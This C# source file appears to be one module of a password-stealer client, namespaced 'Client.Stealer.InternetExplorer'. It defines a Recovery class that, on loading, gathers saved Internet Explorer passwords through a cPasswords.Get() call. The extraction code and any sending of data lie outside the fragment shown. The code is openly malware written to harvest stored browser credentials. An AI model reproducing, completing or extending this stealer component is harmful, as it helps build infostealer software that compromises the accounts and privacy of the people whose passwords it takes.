using System.IO;
using System.Text;

namespace Client.Stealer.InternetExplorer
{
    internal sealed class Recovery : Browser
    {
        public Recovery() : base()
        {
            type = "IE";
        }
        protected override void Load()
        {
            base.Load();
            pPasswords = cPasswords.Get();
        }
    }
}
